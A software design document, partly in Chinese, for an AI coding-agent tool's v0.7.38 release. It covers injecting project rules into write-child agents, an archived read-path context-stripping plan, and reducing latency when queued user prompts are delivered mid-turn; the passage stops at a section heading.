# v0.7.38 Feature Designs

> 中文标题：`v0.7.38 Feature 设计`
>
> Version: `v0.7.38`
>
> Status: Implemented (release candidate, 2026-05-09)
>
> Theme:
> 1. **FEATURE_149 — Queued Prompt Injection Latency & Mid-Turn UX Parity**：消除"排队 prompt 不及时注入"的多重延迟源（hardcoded `setTimeout(50)` + AGENTS.md/CLAUDE.md 每轮无缓存重读 + 80ms flush 抖动），并补齐 Claude Code 风格的 mid-turn UX（interruptible tool fast-abort + 批量 drain 进单轮多 user message + up-arrow popAllEditable）。
> 2. **FEATURE_117 v2 — Mutation Context Injection（reversed scope, v0.7.38 ships）**：原"Read-Path Context Stripping"经实施期事实核查反向——`child-executor.ts` 已用 `systemPromptOverride: CHILD_AGENT_SYSTEM_PROMPT` 短路 `buildSystemPrompt`，child 处于 ~500 token 干净状态无可省。真实问题是反向的：**write child 与 read child 共用同一 minimal override，看不到 AGENTS.md 的 mutation policy / forbidden items / coding style**。v2 在 write child path 注入 AGENTS.md（read child 维持不变）。配套清理：`agents-loader.ts` 移除 `CLAUDE.md` fallback（KodaX 只读 `AGENTS.md`，避免 Claude Code 专属语义文件注入错配）。

---

## 总览

v0.7.38 包含三个 feature 工作流：

- **FEATURE_149**：解决"排队 prompt 不及时注入"的延迟 + mid-turn UX 缺口（详见下文）。
- **FEATURE_117 v2**：write child 注入 AGENTS.md mutation policy（read child 不变）。原稿 v1 设计（"strip read-path"）经实施期事实核查后被反转——见下文 §FEATURE_117 v2 design。
- **FEATURE_114 Slice 6/7/8**：v0.7.36 落地的 V2 Worker+Evaluator 双角色架构在本版本完成 baseline eval、V1 vs V2 apples-to-apples 对比、以及默认 flag 翻转（V2 成为默认路径）。详见下文 §FEATURE_114 Slice 6/7/8（Breaking 行为变更，opt-out via `KODAX_HARNESS_V2=false`）。

> v1 原稿的"Read-Path Stripping"基于一个**假定 child 继承父 5.2k token stable context**的前提。Phase 3 实施期代码核查 [`packages/coding/src/child-executor.ts`](../../packages/coding/src/child-executor.ts) 发现 `systemPromptOverride: CHILD_AGENT_SYSTEM_PROMPT` 已经走 [`agent-runtime/reasoning-plan-entry.ts:112-113`](../../packages/coding/src/agent-runtime/reasoning-plan-entry.ts#L112-L113) `??` 短路 `buildSystemPrompt`——child 已是 ~500 token 干净状态，无 token 可省。原假设全部基于错误前提。
>
> v1 完整原稿在 git history (`docs/features/v0.7.38.md` v0.7.38-rc1 之前) 保留作历史记录。

---

## FEATURE_117 v2: Write-Child Mutation Context Injection

**Status**: Implemented (v0.7.38)
**Priority**: Medium
**Category**: Enhancement / Correctness (project-rules compliance)

### 背景

[`packages/coding/src/child-executor.ts`](../../packages/coding/src/child-executor.ts) 当前对 read 与 write child **共用同一 minimal override**：

```ts
// child-executor.ts before v2 (read + write 都用这一行)
context: {
  ...,
  systemPromptOverride: CHILD_AGENT_SYSTEM_PROMPT, // ~500 token, no project rules
  ...
}
```

`CHILD_AGENT_SYSTEM_PROMPT` 是一段 task-focused parallel-tool-call 引导文本，**不含 AGENTS.md**（mutation policy / forbidden items / coding style）。对 read child 这是合理的——它只调 read/grep/glob/bash-readonly，不会违反项目规则。

但 **write child（H2 Generator fan-out，独立 worktree 写入）也用这一行**——这意味着 write child 完全看不到项目级的 mutation 规则。例如 KodaX 自身 `AGENTS.md` 的 `❌ NEVER use \`any\``、`❌ NEVER hardcode config`、`❌ NEVER commit console.log` 等约束，write child 不知道这些约束就会写出违规代码。Evaluator review 阶段才会发现，浪费 fan-out 成本。

### 设计

**Step 1** — `buildWriteSystemPrompt(gitRoot)` helper（[`packages/coding/src/child-executor.ts`](../../packages/coding/src/child-executor.ts) 内部，不导出）：

```ts
async function buildWriteSystemPrompt(gitRoot: string): Promise<string> {
  const agentsFiles = loadAgentsFiles({ cwd: gitRoot, projectRoot: gitRoot });
  const formatted = formatAgentsForPrompt(agentsFiles);
  if (!formatted) return CHILD_AGENT_SYSTEM_PROMPT;
  // formatted 已含自身的 `# Project Context` H1 + `## … Rules` H2 + `---`，
  // 不再外包 H2，否则 heading 会出现 H2→H1 倒置。仅前置一句 framing。
  return [
    CHILD_AGENT_SYSTEM_PROMPT,
    '',
    'Project rules apply to your mutations. Follow them as the parent agent would:',
    formatted,
  ].join('\n');
}
```

**Step 2** — `executeWriteChild` 用 helper 替换字面量 override（read child 不动）：

```ts
const writeSystemPrompt = await buildWriteSystemPrompt(parentCtx.gitRoot ?? wtPath);
// ...
context: {
  gitRoot: wtPath,
  executionCwd: wtPath,
  systemPromptOverride: writeSystemPrompt,
  excludeTools: CHILD_EXCLUDE_TOOLS_BASE,
}
```

**关键设计点**：

1. **Lookup 用 `parentCtx.gitRoot`，不用 `wtPath`**：worktree 是同 repo 的临时 checkout，其内部不含 AGENTS.md（worktree create 不会复制非 tracked 文件）。AGENTS.md 必须从原 project root 找。
2. **缓存复用 FEATURE_149 Phase 1.2 mtime cache**：`loadAgentsFiles` 已有模块级 `fileContentCache` (`agents-loader.ts:69`)，多 child fan-out 同一 AGENTS.md 仅触发一次 disk read。
3. **prompt cache 友好**：write child 的 system prompt = 稳定 `CHILD_AGENT_SYSTEM_PROMPT` + 稳定 AGENTS.md content，Anthropic `cache_control: ephemeral`（FEATURE_116）覆盖整段——5 min cache window 内 fan-out 只在第一次计费。
4. **Read child 完全不动**：read child 不 mutate，AGENTS.md 不适用——继续走 bare `CHILD_AGENT_SYSTEM_PROMPT`。

### 配套清理（v0.7.38 同期，**不属于 FEATURE_117 范围**）

[`packages/coding/src/context/agents-loader.ts`](../../packages/coding/src/context/agents-loader.ts) `CONTEXT_FILE_CANDIDATES` 从 `["AGENTS.md", "CLAUDE.md"]` 改为 `["AGENTS.md"]`。

**Why**：KodaX **只读 `AGENTS.md`，不读 `CLAUDE.md`**——`CLAUDE.md` 是 Claude Code 专属项目规则文件（其内容是写给 CC CLI 消费的）。当一个项目同时有 `AGENTS.md` + `CLAUDE.md` 时内容通常重合：fallback 在两个目录层级都命中即双重注入；项目仅有 `CLAUDE.md` 时把 CC 专属规则注入到 KodaX agent 上下文会造成语义错配。Dogfood KodaX 仓库自身 `docs/CLAUDE.md` 就是 CC 项目规则，是该 bug 的真实命中场景。

**Minor breaking change**：项目仅有 `CLAUDE.md`、无 `AGENTS.md` 时，KodaX 不再读取——迁移：`mv CLAUDE.md AGENTS.md` 或建 symlink（`AGENTS.md` 是跨工具的标准 AI-agent 规则文件名）。CHANGELOG 标记。

### 影响范围

**新增**：
- `packages/coding/src/child-executor.ts`：`buildWriteSystemPrompt` helper（~15 LoC）
- `packages/coding/src/child-executor.test.ts`：4 个 unit case 锁定 v2 行为（write 注入 / 无 AGENTS.md fallback / read 不注入 / lookup 用 parent gitRoot）
- `docs/test-guides/FEATURE_117_v0.7.38_TEST_GUIDE.md`：人测引导

**修改**：
- `packages/coding/src/child-executor.ts:executeWriteChild` 替换 1 行 `systemPromptOverride` literal
- `packages/coding/src/child-executor.ts` export `CHILD_AGENT_SYSTEM_PROMPT`（test 断言用）
- `packages/coding/src/context/agents-loader.ts` `CONTEXT_FILE_CANDIDATES = ["AGENTS.md"]`（配套清理，已在 FEATURE_149 Phase 1.2 同期落地）

**不改动**：
- read child 的 system prompt（仍 bare `CHILD_AGENT_SYSTEM_PROMPT`）
- Worker (parent) 的 system prompt（FEATURE_117 仅作用于 child path，parent 走 `buildSystemPrompt` 全流程）
- `loadAgentsFiles` / `formatAgentsForPrompt` 内部实现（直接复用）
- tool registry / tool definitions / FEATURE_119 Pattern B 路径

### 验收标准

1. **write child 收到 AGENTS.md mutation policy**：unit test 断言 `systemPromptOverride` 包含 AGENTS.md sentinel + `## Mutation Policy` 标题
2. **read child 不收到 AGENTS.md**：unit test 断言 `systemPromptOverride === CHILD_AGENT_SYSTEM_PROMPT`，且不含 AGENTS.md sentinel
3. **无 AGENTS.md 时 fallback 干净**：write child 在无 AGENTS.md 仓库下 `systemPromptOverride === CHILD_AGENT_SYSTEM_PROMPT`（不含 `Mutation Policy` 块）
4. **lookup 走 parent gitRoot**：worktree 路径不含 AGENTS.md 时仍能从 parent gitRoot 找到——unit test 用独立 tmpdir 模拟
5. **CLAUDE.md fallback 已移除**：`agents-loader.ts:CONTEXT_FILE_CANDIDATES` 仅含 `"AGENTS.md"`
6. **既有 child-executor 测试全绿**：25 个原有 case + 4 个新 case = 29 case 全部 PASS
7. **跨 family 不退化**：本 feature 表面 ~17 LoC，无新 prompt 内容（仅复用 AGENTS.md 项目内容），不触发 prompt eval gate

### 非目标

- **不** strip read child 的 context（已经是 minimal，无可省）
- **不** 在 read child 上注入 AGENTS.md（read 不 mutate，规则不适用）
- **不** 给 write child 加 `.kodaxrc` / git status / project-snapshot（这些不是 mutation policy）
- **不** 持久化 stripping 决策（每次 child invocation 独立判断，基于 bundle.readOnly）
- **不** 引入 feature flag（~17 LoC 改动不需要复杂 escape hatch；不过门直接 revert commit）
- **不** 改 `loadAgentsFiles` 行为（仅用现有 API）
- **不** 改 `CHILD_AGENT_SYSTEM_PROMPT` 文本本身（保持 read/write 共享 base，避免分叉）

### 与其他 Feature 的关系

- **依赖 FEATURE_119（v0.7.36）**：Pattern B `readOnly: boolean` 字段是 read/write 派发分流的判定条件，FEATURE_117 v2 在 write 分支增强
- **协同 FEATURE_116（v0.7.37）**：`cache_control: ephemeral` 覆盖系统 prompt → 注入的 AGENTS.md 在 5 min cache window 内 fan-out 仅计费一次
- **协同 FEATURE_149 Phase 1.2（同版本）**：`agents-loader.ts` mtime cache 让多 write child fan-out 仅触发一次 disk read
- **正交 FEATURE_149**：117 改 child path system prompt，149 改 user input path 延迟，无 conflict

### 参考

- [`packages/coding/src/child-executor.ts:buildWriteSystemPrompt`](../../packages/coding/src/child-executor.ts) — v2 实现
- [`packages/coding/src/context/agents-loader.ts:loadAgentsFiles`](../../packages/coding/src/context/agents-loader.ts) — AGENTS.md walker
- [`packages/coding/src/agent-runtime/reasoning-plan-entry.ts:112-113`](../../packages/coding/src/agent-runtime/reasoning-plan-entry.ts#L112-L113) — `systemPromptOverride ?? buildSystemPrompt(...)` 短路点

---

> **以下为 v1 原稿（"Read-Path Context Stripping"），保留作历史记录。v1 前提（"child 继承父 5.2k token context"）经实施期事实核查被否定，已被 v2 替换。**

## FEATURE_117 v1（archived）: Read-Path Context Stripping — Skip CLAUDE.md/AGENTS.md/git status for Read-Only Children

**Status**: ~~Planned~~ → **Replaced by v2 (above) in v0.7.38**

> v1 假设 child 继承父 5.2k token stable context（CLAUDE.md ~3k + AGENTS.md ~2k + git status）。Phase 3 实施期检查 `child-executor.ts:236, 311` 发现 `systemPromptOverride` 已短路 `buildSystemPrompt`——child 实际处于 ~500 token 干净状态，原稿数字（5.2k token / $187 月节省）全部基于错误假设。
>
> **真实问题反向**：write child 同样走这条 minimal override 路径，看不到 AGENTS.md 的 mutation policy。v2 = 在 write child 注入 AGENTS.md（read child 维持 minimal），上文是 v2 设计。
>
> v1 设计稿正文保留如下作反例参考。

### 背景

#### 当前 child 派发的 context payload

[`packages/coding/src/child-executor.ts:32-67`](../../packages/coding/src/child-executor.ts#L32-L67) 通过 lazy-load `runKodaX` 给 child 起一个**全新的 agent run** —— child 不继承 parent 已组装的 system prompt，而是自己调用 `buildSystemPrompt` → [`packages/coding/src/prompts/capability-sections.ts`](../../packages/coding/src/prompts/capability-sections.ts) 重新拼装 13 个 capability section（FEATURE_142 v0.7.35.1 Batch E 的统一入口）。

`capability-sections.ts` 文件头注释列出的 13 个 section 中，与 read-only child 相关的判定如下：

| # | Section ID | 当前触发条件 | Read-only child 是否需要 |
|---|---|---|---|
| 1-5 | base-system / suffix / environment / runtime-fact / working-directory | 总是注入 | ✅ 需要（基础协议 + cwd / platform） |
| 6 | `git-context` | `isNewSession && repo has git output` | ❌ 不需要（child 不 commit / reset） |
| 7 | `project-snapshot` | `isNewSession` | ✅ 需要（**read-only child 用于文件结构导航**） |
| 8 | `repo-intelligence-context` | `context.repoIntelligenceContext` 非空 | ✅ 需要（repointel 数据是 read-only 价值核心） |
| 9 | `mcp-capability-context` | extensionRuntime 返回 mcp ctx | ✅ 需要（MCP 工具发现） |
| 10 | `prompt-overlay` | `context.promptOverlay` | ✅ 需要（routing 配套） |
| 11 | `project-agents` | AGENTS.md / CLAUDE.md 找到 | ❌ 不需要（mutation policy 不适用 read-only） |
| 12 | `skills-addendum` | `context.skillsPrompt` | ✅ 需要（skills 是 read-only child 也可用） |
| 13 | `tool-construction` | `toolConstructionMode` 含此模式 | ✅ 需要（tool semantics） |

**Strip 目标 = section 6 + section 11 共 2 项。**

> **修订说明**（与原设计稿对齐）：
> - 原稿列出的 `.kodaxrc` 不在 system prompt 注入路径——`grep -rn "kodaxrc" packages/ src/` 在非测试代码中**完全不命中**，是从 Claude Code 对照引入的 phantom 目标，**已删除**
> - 原稿列出的"git status -s"对应 `capability-sections.ts:292` `git status --short`——位置确认正确
> - 原稿假设的"`buildChildSystemPrompt(parentSystemPrompt, …)` 后过滤"路径**与现实不符**——child 是独立 agent run 自己 build prompt，没有"继承"过程。改为在 child 自己 build 时通过 `KodaXOptions` flag gate section 即可

总 token 估算：CLAUDE.md ~3k + AGENTS.md ~2k + git status ~200 = **~5.2k tokens 浪费**。

按 KodaX 当前 daily Worker turn ~200 / 平均 fan-out 2 read-only child = ~400 child invocations/day，**每个 child 省 5.2k tokens × $3/M（Sonnet 4.6 input）= $0.0156 节省/child × 400 = $6.24/day = $187/month**（单用户）。

#### Phase 0.7 实测对照

Claude Code Explore agent 的 system prompt：
- 不含 CLAUDE.md
- 不含 AGENTS.md
- 不含 git status
- 仅含：base system prompt + tool definitions（仅 read 类工具）

所以 Explore agent 单次 invocation 的 input tokens 只有 ~6k；KodaX 当前 read-only child ~12k——存在 ~45% 缩减空间。

### 设计

#### 缩窄版策略：在 child 自己 build prompt 时 gate 两个 section

不做 block 化重构、不抽 helper、不改 capability-sections 的语义。仅在 [`packages/coding/src/types.ts`](../../packages/coding/src/types.ts) `KodaXOptions` 加一个 optional flag，并在 `capability-sections.ts` 的 section 6 / 11 condition 里 OR 上 gate：

**Step 1** — `KodaXOptions` 加字段（`packages/coding/src/types.ts`）：

```ts
export interface KodaXOptions {
  // ...existing fields...

  /**
   * @experimental FEATURE_117 (v0.7.38)
   * Skip stable system-prompt sections that read-only child agents do not need.
   * Set by child-executor when dispatching read-only children. Parent / mutation
   * children leave this undefined → all sections preserved.
   */
  readonly systemPromptStrip?: {
    readonly agentsMd?: boolean;   // skip section 11 (project-agents = CLAUDE.md/AGENTS.md)
    readonly gitContext?: boolean; // skip section 6  (git-context = `git status --short`)
  };
}
```

**Step 2** — `capability-sections.ts` 在两个 section 的 condition 里 OR 上 gate（~6 LoC）：

```ts
// section 6: git-context
if (isNewSession && hasGitOutput && !options.systemPromptStrip?.gitContext) {
  sections.push(createPromptSection('git-context', ...));
}

// section 11: project-agents
const agentsFiles = options.systemPromptStrip?.agentsMd
  ? []
  : loadAgentsFiles({ cwd: executionCwd });
if (agentsFiles.length > 0) {
  sections.push(createPromptSection('project-agents', ...));
}
```

**Step 3** — `child-executor.ts` 在派 read-only child 时把 flag 注入 child 的 `KodaXOptions`（~6 LoC）：

```ts
const childOptions: KodaXOptions = {
  ...inheritedOptions,
  ...(readOnly ? {
    systemPromptStrip: { agentsMd: true, gitContext: true }
  } : {}),
};
const childResult = await runKodaX(childOptions, taskPrompt);
```

总实施量 **~15 LoC**（vs 原稿的 ~100 行 block 化重构），符合 KodaX minimalist 原则。

#### Tool restriction（既有）

`dispatch_child_task` schema 的 `readOnly: true` 已经触发 tool whitelist 缩减到 `read/grep/glob/bash`（bash 走 read-only sandbox）。FEATURE_117 不动这部分。

#### Fail-safe：child LLM 主动声明需要

如果 read-only child 在 task 中发现确实需要 CLAUDE.md（极少见），child 可以调 `read('CLAUDE.md')` 工具自行获取。**不在系统层做 fallback 预注入**——child 工具集允许 read，强制注入是过度设计。

#### Cost telemetry 验证

`packages/ai/src/cost-tracker.ts` 在 child invocation 完成时记录 `inputTokensSavedByStripping` 字段（基于 stripped section 的 token count 估算 = `sum(section 6 + 11 rendered length / 4)`）。`/cost` 命令输出每日累计节省。

### 影响范围

**新增**：
- `tests/feature-117-child-readonly-stripping.test.ts`：unit test 覆盖 readOnly=true 时 section 6 + section 11 不出现 / readOnly=false 时全部 13 section 出现
- `tests/feature-117-child-readonly-stripping.eval.ts`：FEATURE_104 prompt eval — 3 task class（lookup / audit / cross-file search）× 8 alias = 24 cells，read-only child 完成率 ≤ 2pp 退化
- `docs/test-guides/FEATURE_117_v0.7.38_TEST_GUIDE.md`：人测引导

**修改**：
- [`packages/coding/src/types.ts`](../../packages/coding/src/types.ts)：`KodaXOptions` 加 `systemPromptStrip` 字段（~6 行 + JSDoc）
- [`packages/coding/src/prompts/capability-sections.ts`](../../packages/coding/src/prompts/capability-sections.ts)：section 6 + section 11 condition 加 gate（~6 行）
- [`packages/coding/src/child-executor.ts`](../../packages/coding/src/child-executor.ts)：read-only child 派发时注入 `systemPromptStrip` flag（~6 行）
- [`packages/ai/src/cost-tracker.ts`](../../packages/ai/src/cost-tracker.ts)：新增 `inputTokensSavedByStripping` 字段 + `/cost` 输出（~10 行）

**不改动**：
- mutation child 的 system prompt（保持完整 context）
- tool registry / tool definitions（FEATURE_119 已做 read-only tool whitelist）
- Worker (parent) 的 system prompt（FEATURE_117 仅作用于 child path）
- `loadAgentsFiles` / `agents-loader.ts` 内部逻辑（被 FEATURE_149 A2 加 cache，与本 feature 正交）
- 其他 11 个 section 的 condition（包括 `project-snapshot` — read-only child 仍需要文件结构导航）

### 迁移策略

```
v0.7.38（本 feature）：
  - read-only child 自动 strip 两个 section（无 feature flag — 改动表面 15 行不需要复杂 escape hatch）
  - 跑 prompt eval 三类 read-only 任务证明不退化（≤ 2pp）
  - 不过门 → 单 feature 回退 v0.7.38.1，149 ship 不阻塞

v0.7.39+：
  - 监测一周生产 telemetry 验证 read-only child 完成率不退化
  - 如确认稳定，可考虑 mutation child 也部分 strip（v0.7.42+ 评估）
```

### 验收标准

1. **read-only child 不收到 section 6 + section 11**：unit test 断言 `KodaXPromptSnapshot.sections` 不含 `git-context` + `project-agents` id
2. **mutation child 仍收到全 13 section**：`readOnly: false` 时 section 数与 baseline 一致
3. **read-only 任务完成率不退化**：FEATURE_104 prompt eval 三类（lookup / audit / cross-file search）在 8 alias mean ≥ baseline 退化 ≤ 2pp
4. **cost 节省可验证**：`/cost` 命令输出 `Saved by read-path stripping: X tokens (Y$)`
5. **child 仍能 read CLAUDE.md（如确需）**：read-only child 在工具集允许范围内可以主动 read 任意文件
6. **跨 family 验证**：8 alias（涵盖 GLM/Kimi/Claude/GPT family）read-only child 在 stripping 后 max-min spread ≤ 15pp
7. **`section 7 project-snapshot` 仍注入**：read-only child 仍能感知项目文件结构（断言 section id `project-snapshot` 存在）
8. **无回归**：既有 child-executor / dispatch-child-task 测试全绿；FEATURE_119 Pattern B 路径全绿

### 非目标

- **不** strip mutation child 的 context（mutation 需要知道 coding-style / forbidden items）
- **不** strip Worker (parent) 的 context（Worker 是用户面对的 agent，必须有完整 context）
- **不** strip section 7 `project-snapshot`（read-only child 需要文件结构导航）
- **不** 引入 fine-grained per-line stripping（section-level gate 已足够）
- **不** 给 read-only child 加 fallback 预注入"必要的 read-style hint"（child 工具集已允许 read）
- **不** 持久化 stripping 决策（每次 child invocation 独立判断，基于 dispatch schema 的 readOnly）
- **不** 引入 `KODAX_CHILD_READPATH_STRIP` env var（改动表面 15 行不需要复杂 escape hatch；不过门直接 revert feature commit）
- **不** 在 self-construction 生成的 agent 上自动 strip（自定义 agent 的 readOnly 由 admission contract 验证后决定）
- **不** 做 block 化重构（capability-sections 已是结构化 13 section，加 condition gate 即可）

### 与其他 Feature 的关系

- **依赖 FEATURE_119（v0.7.36）**：Pattern B 引入 `readOnly: boolean` 字段，FEATURE_117 消费这个字段
- **协同 FEATURE_116（v0.7.37）**：cache_control 减少 stable 部分重复计费；FEATURE_117 减少 read-only child 的 context payload——两个独立维度的成本优化
- **辅助 FEATURE_102（v0.7.45）**：FEATURE_102 capability routing 可以把 stripping 后的 child invocation routing 到更便宜的 model（如果 capability profile 允许）
- **辅助 FEATURE_120（v0.7.39）**：FEATURE_120 的 `model_hint?: 'fast'` 字段在 read-only + stripped child 上效果最好（小 input → fast model 完全够用）

### 参考

- Claude Code Explore agent system prompt：`c:/Works/claudecode/src/agents/explore.ts` system prompt 不含 CLAUDE.md
- KodaX child-executor：[`packages/coding/src/child-executor.ts:32-67`](../../packages/coding/src/child-executor.ts#L32-L67)（lazy-load runKodaX 独立 agent run）
- KodaX system prompt assembly：[`packages/coding/src/prompts/capability-sections.ts`](../../packages/coding/src/prompts/capability-sections.ts) 13 个 section 单一 source of truth（FEATURE_142 v0.7.35.1 Batch E）
- FEATURE_098 per-model context window data：[features/v0.7.28.md](v0.7.28.md)
- Phase 0.7 调研：`c:/tmp/claude-code-multi-agent-deep-dive.md` §Explore agent system prompt

---

## FEATURE_149: Queued Prompt Injection Latency & Mid-Turn UX Parity

**Status**: Planned
**Priority**: High
**Category**: Enhancement / UX + Internal / Performance

### 背景

用户实战反馈："输入 queue 排队指令时，并没有尽快注入"——感觉 KodaX 在 Claude Code 风格的多轮对话节奏上有明显"卡顿"。Phase 0.7 forensic 对照（`c:/Works/claudecode/src/`）证实**这不是错觉**，KodaX 在"上一轮结束 → 排队 prompt 实际抵达 LLM"之间叠加了 4 个延迟源 + 3 个架构 UX 缺口。

#### 已定位的延迟源（每轮排队均触发）

| # | 位置 | 性质 | 估算延迟 | Claude Code 对照 |
|---|---|---|---|---|
| L1 | [`packages/repl/src/ui/InkREPL.tsx:6267`](../../packages/repl/src/ui/InkREPL.tsx#L6267) | `stageQueuedPrompt` 末尾硬编码 `await new Promise(r => setTimeout(r, 50))` | **+50ms 不可避免** | 无（`queueProcessor.ts:52` 同步 dequeue + `void executeInput()`，零延迟） |
| L2 | [`packages/coding/src/context/agents-loader.ts:70`](../../packages/coding/src/context/agents-loader.ts#L70) `loadAgentsFiles` | 每轮 `existsSync` + `readFileSync` 全树遍历 cwd → root，无 mtime 缓存 | **+2~15ms / 轮**（视仓库深度 + 磁盘） | `claudemd.ts` + `fileReadCache.ts` mtime cache，命中即字节复用 |
| L3 | [`packages/repl/src/ui/contexts/StreamingContext.tsx:344`](../../packages/repl/src/ui/contexts/StreamingContext.tsx#L344) `FLUSH_INTERVAL = 80` | 流式 token batch flush 80ms 节流；如果 round-complete 信号挂在 React 状态 commit 上，可能延迟检测 | **0~80ms 抖动** | 无对应延迟（store `useSyncExternalStore` 在 commit 前同步发布，无 80ms 节流） |
| L4 | [`packages/repl/src/ui/contexts/StreamingContext.tsx`](../../packages/repl/src/ui/contexts/StreamingContext.tsx) `notify()` 走 `forceUpdate()` 订阅 | 队列变更通过 `forceUpdate` 推 React scheduler，非 sync external store | **+1~16ms 抖动**（一个 React tick） | `useSyncExternalStore` 在 commit 前同步读取 store snapshot |

**单轮排队累计**：`50 + (2~15) + (0~80) + (1~16) = 53~161ms` 之间，**floor 53ms**——用户在两轮快速排队时累计感知 100~300ms 卡顿。

#### 架构 UX 缺口（与 Claude Code 不对等的"自然感"差距）

| # | 缺口 | KodaX 现状 | Claude Code 行为 |
|---|---|---|---|
| G1 | **Interruptible-tool fast-abort** | submit 时永远走 `addPendingInput`（[`InkREPL.tsx:6522-6544`](../../packages/repl/src/ui/InkREPL.tsx#L6522-L6544)），30s 的 bash 工具必须跑完才轮到下一条 | `handlePromptSubmit.ts:331` 检测 `hasInterruptibleToolInProgress`（工具标 `interruptBehavior: 'cancel'`）时立即 `abortController.abort('interrupt')` 中断当前轮 |
| G2 | **批量 drain 单轮多 user message** | [`queued-prompt-sequence.ts:32-43`](../../packages/repl/src/ui/utils/queued-prompt-sequence.ts#L32-L43) 一次 shift 一条跑一整轮 agent，N 条 = N 次 agent 调用 | `queueProcessor.ts:52-87` 同 mode 多条命令批量 drain 进单次 `executeUserInput([...commands])`，多条 user message 进同一轮 context |
| G3 | **Up-arrow popAllEditable** | [`pending-inputs.ts:14-25`](../../packages/repl/src/ui/utils/pending-inputs.ts) 只显示一行摘要 + Esc 砍最新，不可编辑/重排 | `messageQueueManager.ts:428` `popAllEditable()` 把整个队列 pop 回输入框可编辑 |

### 设计

#### Slice A：消除延迟源（零行为变更，无需 prompt eval）

**A1 — 移除 hardcoded `setTimeout(50)`**

[`InkREPL.tsx:6267`](../../packages/repl/src/ui/InkREPL.tsx#L6267) 的 50ms 等待是历史遗留（git blame 待考古，疑似为"等 React 状态 commit"的盲等待）。改为 `flushSync` 包裹同步 state 写入：

```ts
const stageQueuedPrompt = useCallback(async (prompt: string) => {
  const normalizedPrompt = prompt.trim();
  if (!normalizedPrompt) return;

  // flushSync 确保下一轮 runRound 读到最新 history / submitCounter / context
  flushSync(() => {
    addHistoryItem({ type: "user", text: normalizedPrompt });
    setSubmitCounter((prev) => prev + 1);
    touchContext(context);
  });
}, [addHistoryItem, context]);
```

**A2 — AGENTS.md / CLAUDE.md mtime cache**

[`packages/coding/src/context/agents-loader.ts`](../../packages/coding/src/context/agents-loader.ts) `loadAgentsFiles` 加 module-level `Map<string, { mtimeMs: number; content: string }>`，`statSync().mtimeMs` 命中则字节复用。Cache key = 绝对路径，cache miss / mtime mismatch 时正常 read 并写回。**Singleton pattern**（与 `process.env.NODE_ENV` 同模式），不引入 DI。

**A3 — Round-complete 信号与 80ms FLUSH_INTERVAL 解耦审计**

> **审计结论（实施时落实）**：[`StreamingContext.tsx:344`](../../packages/repl/src/ui/contexts/StreamingContext.tsx#L344) `FLUSH_INTERVAL = 80` 仅作用于流式 token 渲染批量提交（`appendResponse` / `appendThinking` 走 `scheduleFlush()`）。所有状态切换方法（`setState` / `startStreaming` / `stopStreaming` / `setError` / `clearResponse` …等共 22 处）入口都**同步**调用 `flushPendingUpdates()` 清队列，`runRound` resolve 与 round-complete 检测路径中**不存在** 80ms 排队等待。L3 在 forensic 阶段提的"0~80ms 抖动"假设经实施期审计**不成立**，本子项无需代码改动；保留此节作为决策记录。

**A4 —（已 defer 到 v0.7.39+）队列 notify 改 `useSyncExternalStore`**

> **实施期决策**：本子项标"可选"是审慎设计。`StreamingContext` 当前 `subscribe`/`forceUpdate` 订阅模式有 N 个消费者组件，全量迁移 `useSyncExternalStore` 涉及面 ~30 行 + 跨组件回归面，风险显著。**A1 移除 `setTimeout(50)` 已拿到 ~90% 体感改善**（floor 53ms → < 5ms），剩余 ~16ms React tick 抖动单独追求性价比低。defer 到 v0.7.39+，等 telemetry 显示该路径仍是瓶颈再做。本 feature ship 时不实施。

#### Slice B：架构 UX 对齐（行为变更，触发 prompt eval）

**B1 — Tool `interruptBehavior` 字段 + fast-abort 路径（infrastructure-ready，无 tool opt-in）**

`packages/coding/src/tools/types.ts` 新增可选字段：

```ts
interface LocalToolDefinition {
  // ...existing...
  interruptBehavior?: 'cancel' | 'wait';  // 默认 'wait'
}
```

[`InkREPL.tsx:handleSubmit`](../../packages/repl/src/ui/InkREPL.tsx) 在 `isLoading && canQueueFollowUps` 分支前置检查：当前 `currentTool?.interruptBehavior === 'cancel'` 时，先 `addPendingInput` + `abort({ preservePendingInputs: true })`，下一轮立即起。否则走原排队路径。

`StreamingContext.abort` 新增 `AbortOptions { preservePendingInputs?: boolean }`：默认行为（Esc）清空队列，fast-abort 调用方传 `true` 保留刚提交的 prompt 给下一轮 drain。

**关键设计修正（实施期 2026-05-09）**：原稿规划 `bash` / `dispatch_child_task` 同步等待路径标 `'cancel'`，**已撤回**。事实核查 `c:/Works/claudecode/src/`：

```bash
$ grep -rn "interruptBehavior" c:/Works/claudecode/
# 5 处出现，0 个具体 tool 实现 interruptBehavior() => 'cancel'
```

[`Tool.ts:416`](c:/Works/claudecode/src/Tool.ts#L416) 接口存在但 BashTool / FileEditTool / TaskGetTool / TaskOutputTool 全部默认 `'block'`（≈ KodaX 的 `'wait'`）。[`StreamingToolExecutor.ts:255-259`](c:/Works/claudecode/src/services/tools/StreamingToolExecutor.ts#L255) 的 `hasInterruptibleToolInProgress` 判定用 `executing.every(t => 'cancel')`——只要有一个 'block' 就否决整体，**生产中几乎从不命中**。CC 注释 "e.g. SleepTool" 的 SleepTool 自己也没标，是为未来"显式无副作用等待工具"留的钩子。

**为什么不能照搬到 bash / await_child_task**：
- **bash 中断 = SIGTERM**：子进程可能写了一半文件、改了一半数据库、推了一半 git，留下半完成状态比让它跑完更危险
- **await_child_task 中断**：FEATURE_119 Pattern B 设计是 child 后台 detached 跑——abort 主轮后 child 还在 worktree 里继续写，造成"幽灵 child"

**实际落地**：
- `ToolInterruptBehavior` 类型 + `LocalToolDefinition.interruptBehavior` 字段：保留（接口与 CC 对齐）
- `InkREPL.tsx` fast-abort 路径：保留（接口齐了，没工具触发就走默认路径，是 dead-ish path 直到未来加纯等待工具）
- `bash` / `await_child_task`：**不**标 `'cancel'`（与 CC 一致的保守默认）
- 用户 ESC 仍是显式 abort 入口（不变）

**B2 — Abort 时合成 `tool_result` error block（已撤销，无需实施）**

实施期检查 substrate：[`run-substrate.ts:1447`](../../packages/coding/src/run-substrate.ts) AbortError 已经 graceful resolve `{ success: true, interrupted: true }`，且既有 `cleanupIncompleteToolCalls` + `validateAndFixToolHistory` 在下一轮 LLM 调用前自动剥 orphan `tool_use`。**B2 是修一个不存在的 bug**，撤销，节省 ~20 LoC。

**B3 — 批量 drain 单轮多 user message**

